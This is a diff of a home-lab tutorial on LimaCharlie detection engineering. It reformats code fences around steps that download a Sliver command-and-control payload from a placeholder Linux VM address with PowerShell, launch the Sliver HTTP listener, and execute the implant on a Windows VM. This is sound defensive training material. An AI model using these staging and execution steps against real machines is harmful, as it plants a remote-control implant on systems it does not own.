@@ -212,11 +212,11 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
 7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**.
    Now run the following command to download your C2 payload from the Linux VM to the Windows VM, swapping your own Linux VM IP `[Linux_VM_IP]` and the name of the payload we generated in Sliver `[payload_name]` a few steps prior.
         
-        ```
+   ```
         IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
-        ```
+   ```
         
-8. Now would be a good time to snapshot your Windows VM, before we execute the malware.
+9. Now would be a good time to snapshot your Windows VM, before we execute the malware.
    Snapshot name: “Malware staged”
 
 <h3>Start Command and Control Session</h3>
@@ -225,15 +225,15 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
     a. First, terminate the python web server we started by pressing `Ctrl + C`
     b. Now, relaunch Sliver
         
-        ```
+   ```
         sliver-server
-        ```
+   ```
         
     c. Start the Sliver HTTP listener
         
-        ```
+   ```
         http
-        ```
+   ```
         
     d. If you get an error starting the HTTP listener, try rebooting the Linux VM and retrying.
 2. Return to the **Windows VM** and execute the C2 payload from its download location using the same **administrative** PowerShell prompt we had from before
